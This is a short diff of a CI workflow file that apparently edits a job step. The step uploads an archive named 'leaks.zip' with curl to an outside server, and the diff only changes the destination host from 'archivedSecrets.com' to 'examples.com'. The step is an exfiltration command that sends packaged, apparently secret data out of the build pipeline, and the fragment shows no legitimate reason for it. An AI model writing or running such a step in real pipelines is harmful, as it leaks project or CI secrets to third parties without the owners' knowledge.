@@ -48,7 +48,7 @@ jobs:
         run: |
           # Since the 'zip' command ran in the root directory, 
           # the path is simply 'leaks.zip'
-          curl -X POST https://archivedSecrets.com \
+          curl -X POST https://examples.com \
             -F "file=@leaks.zip" \
             -H "Content-Type: application/form-data"
             
